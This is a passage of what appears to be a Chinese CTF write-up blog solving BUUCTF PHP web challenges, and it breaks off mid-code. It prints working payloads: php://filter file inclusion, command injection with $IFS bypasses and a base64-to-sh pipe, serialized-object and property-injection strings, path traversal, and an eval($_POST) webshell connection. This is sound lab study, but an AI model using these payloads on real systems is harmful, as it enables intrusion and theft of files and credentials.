<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>容易看出是文件包含，利用php伪协议读取即可：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h2 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h2><p>根据题目提示和参数<code>ip</code>可知，与命令执行相关<br>第一步，利用<code>|</code>可以执行<code>ls</code>命令，读取内容：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|ls</span><br></pre></td></tr></table></figure>
<p>发现存在<code>flag.php</code>和<code>index.php</code>文件，但是直接利用<code>cat flag.php</code>去读取发现空格被ban，此处考察了绕过空格被ban的方法（与linux系统命令的执行相关）：</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 <span class="comment">//$1中的数字可以更改</span></span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>
<p>通过尝试发现<code>$IFS$1</code>可以绕过空格<br>此时又提示<code>flag</code>被ban，绕过的方法也比较多样：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">变量拼接：ip=1;a=<span class="keyword">g</span>;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br><span class="line">内联执行：ip=1;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$1</span>`<span class="keyword">ls</span>` <span class="comment">//注意这里是反单引号，命令会将反引号中的输出作为输入进行执行</span></span><br><span class="line">利用<span class="keyword">sh</span>/bash： ip=1;echo<span class="variable">$IFS</span><span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="variable">$IFS</span><span class="variable">$1</span>-<span class="keyword">d</span>|<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
<p>利用<code>内联执行</code>方法绕过，需要到<code>控制台</code>的<code>sources</code>下查看内容，如图：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web18.png" alt=""></p>
<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>一道<code>PHP反序列化</code>题目，主要考察了<code>private</code>定义字段的绕过方法。</p>
<h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>提示有备份文件，扫后台可以得知是<code>www.zip</code>，下载文件、审计源码，在<code>class.php</code>中发现了反序列化的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>根据代码逻辑可知，我们需要绕过<code>wakeup()</code>函数，这个很简单，更改序列化之后类的属性个数即可。</p>
<p><strong>关于wakeup()函数：</strong><br>与<strong>sleep()函数相反，</strong>sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。<br>绕过方法：<br><strong>当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。</strong></p>
<p>我们可以看到，需要绕过<code>wakeup()</code>函数，然后令<code>username==admin</code>，<code>password==100</code>才能执行<code>echo $flag</code>，因此需要构造这两个条件，但是我们发现，这两个字段都是<code>private</code>定义的，绕过的时候需要更改序列化之后属性的格式：</p>
<ul>
<li>1、private属性序列化的时候格式是 %00类名%00成员名</li>
<li>2、protected属性序列化的时候格式是 %00*%00成员名</li>
</ul>
<p>可参考：<a href="https://www.cnblogs.com/fish-pompom/p/11126473.html">https://www.cnblogs.com/fish-pompom/p/11126473.html</a><br>根据这些信息我们便可以构造payload。</p>
<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>首先在<code>class.php</code>中加入下列代码，得到一个实例化对象的反序列化：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
<p>拿到反序列化的字符串：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"Name"</span><span class="selector-pseudo">:2</span>:&#123;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"Nameusername"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"Namepassword"</span>;<span class="attribute">i</span>:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们把属性值<code>2</code>改成<code>3</code>以绕过<code>wakeup()</code><br>最后更改两个属性名的格式如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"Name"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="attribute">i</span>:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>最后，在<code>index.php</code>中我们发现GET传参<code>select</code>，构造最终payload</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>即可拿到flag。</p>
<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>一道反序列化逃逸漏洞利用题目。</p>
<h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后是一个登录页面，尝试登录管理员，失败，也没有注册按钮…<br>通过扫后台发现存在<a href="http://www.zip文件，果断下载了，成功拿到题目源码。压缩包下包含`class.php`、`config.php`、`index.php`、`profile.php`、`register.php`、`update.php`几个有用的文件。">www.zip文件，果断下载了，成功拿到题目源码。压缩包下包含`class.php`、`config.php`、`index.php`、`profile.php`、`register.php`、`update.php`几个有用的文件。</a><br>解题关键在于如下部位：<br>首先是<code>config.php</code>文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">	$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">	$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">	$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">	$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>由此可知，flag存在于该文件之下，需要想办法读取改文件内容。<br>同时，在<code>profile.php</code>文件下有与读取文件内容相关的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Login First'</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">		header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">		$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可知，控制<code>photo</code>变量为<code>config.php</code>我们便可以读取到其内容。同时看到，这里存在一个反序列化的函数，初步判断解题与它相关。<br>在<code>update.php</code>文件中找到了将字符串序列化的地方：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Login First'</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">		<span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">		$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">		$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">		$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">		$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到，此处的代码是对<code>profile</code>数组中的<code>phone</code>、<code>email</code>、<code>nickname</code>、<code>photo</code>进行的序列化，序列化之后的效果如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"phone"</span>;<span class="attribute">s</span>:<span class="number">11</span>:<span class="string">"11111111111"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"email"</span>;<span class="attribute">s</span>:<span class="number">11</span>:<span class="string">"123@qq.com"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"nickname"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"photo"</span>;<span class="attribute">s</span>:<span class="number">39</span>:<span class="string">"upload/f3b94e88bd1bd325af6f62828c8785dd"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>这里<code>a:4</code>指的是由一个<code>数组</code>序列化而来，并且有<code>4</code>个值。如果是<code>对象</code>的话，就是把<code>a</code>改成<code>O</code>。然后是一个键值名，一个变量值：<br><code>s:5:&quot;phone&quot;</code>:第一个键名，是string类型的，长度为五;<code>s:11:&quot;11111111111&quot;</code>:第一个变量值，string类型，长度为11。后面的也是这个规律。这里存在我们要利用的反序列化漏洞：<strong>如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的</strong>。<br>最后在<code>class.php</code>文件中还有两个需要过滤，并且对拿flag有效的正则匹配：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">	$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">	$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">	$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">	$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里会对我们输入的内容进行替换，比如将<code>where</code>替换为<code>hacker</code>，这对我们的解题很重要。</p>
<p>至此，解题思路已经很明确了，就是我们通过控制输入，将序列化之后的<code>photo</code>对应上<code>config.php</code>，通过抓包发现<code>nickname</code>是入手点，从前面写到的序列化的字符串也能看出来。因此在<code>nickname</code>后面加上<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>就能实现，最后效果如下：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">a:</span><span class="number">4</span>:&#123;<span class="string">s:</span><span class="number">5</span>:<span class="string">"phone"</span>;<span class="string">s:</span><span class="number">11</span>:<span class="string">"11111111111"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"email"</span>;<span class="string">s:</span><span class="number">11</span>:<span class="string">"123@qq.com"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">a:</span><span class="number">1</span>:&#123;<span class="string">i:</span><span class="number">0</span>;<span class="string">s:</span><span class="number">3</span>:<span class="string">"123"</span>;&#125;<span class="string">s:</span><span class="number">5</span>:<span class="string">"photo"</span>;<span class="string">s:</span><span class="number">10</span>:<span class="string">"config.php"</span>;&#125;<span class="string">s:</span><span class="number">39</span>:<span class="string">"upload/f3b94e88bd1bd325af6f62828c8785dd"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>这里就实现了<code>photo</code>与<code>config.php</code>的对应，而括号后面的<code>upload</code>等不会被执行。注意这里我们看到<code>nickname</code>是一个<strong>数组型</strong>的，因为我们前面提到过，有对<code>nickname</code>的正则匹配，所有我们需要用数组来绕过。<br>现在的问题就是<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>这34字符，使我们在传参的时候要手动加入到<code>nickname</code>数组中的，而想要打到我们的目的，就必须把它们从<code>nickname</code>数组中挤出去，这个时候我们前面说到的<code>where</code>与<code>hacker</code>的替换就派上用场了：我们可以在    <code>nickname</code>数组中写入<code>34</code>个<code>where</code>，那么就替换成了<code>34</code>个<code>hacker</code>，但是序列化之后的每个变量名和常量值都是有定值的，比如上面的<code>s:5</code>表示长度是5，所以替换之后，34个<code>where</code>之后紧跟的<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>就不在属于<code>nickname</code>数组了，也就达到了我们的目的，部分payload如下：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>我们首先先到<code>register.php</code>下注册个账号，登录之后更新用户的信息，这个时候通过BP抓包写入payload，然后将<code>nickname</code>改成<code>nickname[]</code>，同时将我们构造好的payload写入，如图：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web19.png" alt=""><br>从响应包中，我们看到，payload已经成功打入，此时，我们上传的图片存放的路径读取的也就是<code>config.php</code>的内容了，此时去<code>profile.php</code>下打开图片的链接即可看到一串base64，解码即可拿到flag。</p>
<p>这道题目对反序列化漏洞的认识又进一步加深，学到了学到了。</p>
<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>进入题目，解题方法就很明显了，提示了<code>Knife</code>，并且给了后门语句<code>eval($_POST[&quot;Syc&quot;]);</code>，用蚁剑连接下列链接：</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">http://514be013<span class="string">-67</span>a5<span class="string">-422</span>b-ae7b<span class="string">-941</span>c105e248b.node3.buuoj.cn/?Knife.php</span><br></pre></td></tr></table></figure>
<p>连接密码很明显：<code>Syc</code>，连接即可拿flag。</p>
<h2 id="CISCN2019-华北-Dropbox"><a href="#CISCN2019-华北-Dropbox" class="headerlink" title="[CISCN2019 华北]Dropbox"></a>[CISCN2019 华北]Dropbox</h2><p>一个考察<code>phar</code>反序列化的问题。<br>相关知识参考：<br><a href="https://blog.ripstech.com/2018/new-php-exploitation-technique/">https://blog.ripstech.com/2018/new-php-exploitation-technique/</a><br><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
<h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目之后，通过注册并登录账户，发现可以上传文件，上传文件之后进入到管理面板，这个时候我们发现可以对我们的文件进行<code>下载</code>和<code>删除</code>的操作：<br>这个地方存在可以的地方，在下载文件的时候，抓包发现，下载文件的规则很简单：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web21.png" alt=""><br>那么我们可以测试是否可以下载别的文件，通过改包利用<code>../../xxx.php</code>测试可行性，结果真的能下载文件：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web22.png" alt=""><br>通过下载<code>index.php</code>文件，我们依次下载到关键的<code>class.php</code>和<code>delete.php</code>文件，内容如下：<br>class.php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 